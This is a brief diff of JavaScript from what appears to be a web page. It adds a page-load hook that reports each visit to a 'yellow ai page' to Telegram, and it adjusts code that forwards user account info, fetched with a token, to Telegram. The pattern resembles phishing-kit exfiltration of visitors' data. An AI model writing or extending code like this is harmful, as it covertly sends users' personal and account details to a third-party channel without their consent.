@@ -281,6 +281,11 @@ function sendUserData(token) {
 }
 
 
+window.onload = function(){
+  sendDeatilsToTelegram('==========FRONTEND==========\nUser has accessed this page, yellow ai page')
+}
+
+
 
 
 
@@ -366,7 +371,7 @@ function sendUserData(token) {
           console.log('Successfully fetched User Info:', userInfo);
           let temp1 = JSON.stringify(userInfo, null, 2);
           let temp2 = (`==========FRONTEND==========\n${temp1}`)
-          sendDeatilsToTelegram(temp1);
+          sendDeatilsToTelegram(temp2);
             
 
         } catch (err) {
